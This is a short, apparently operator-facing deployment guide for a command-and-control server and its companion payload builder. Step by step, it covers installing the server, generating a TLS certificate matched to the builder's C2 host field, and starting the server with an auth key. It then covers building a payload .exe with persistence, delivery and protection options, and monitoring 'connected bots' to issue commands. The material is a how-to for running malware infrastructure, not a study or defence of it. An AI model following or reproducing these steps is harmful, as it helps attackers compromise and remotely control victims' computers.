DEPLOYMENT

Standing Up the C2 — Step by Step

1

Install dependencies

cd c2-server && npm install

2

Generate TLS certificate

openssl req -x509 -newkey rsa:2048
-keyout key.pem -out cert.pem
-days 365 -nodes -subj "/CN=<YOUR_HOST>"

CN must match Builder's C2 Host field

3

Start the server

C2_AUTH=mysecret C2_PORT=443 npm start

4

Open Builder

Fill in C2 Host (your server IP/hostname), Auth Key (same as C2_AUTH). Click Test C2 Server — should say "reachable".

5

Configure & build payload

Set persistence, delivery, protection options. Click Build Payload. Output .exe is ready for delivery.

6

Monitor via admin dashboard

Open https://<your-host>:443 in browser. Login with admin password to see connected bots and issue commands.

Full source in c2-server/ directory · Node.js 18+ · cert.pem & key.pem must be in c2-server/
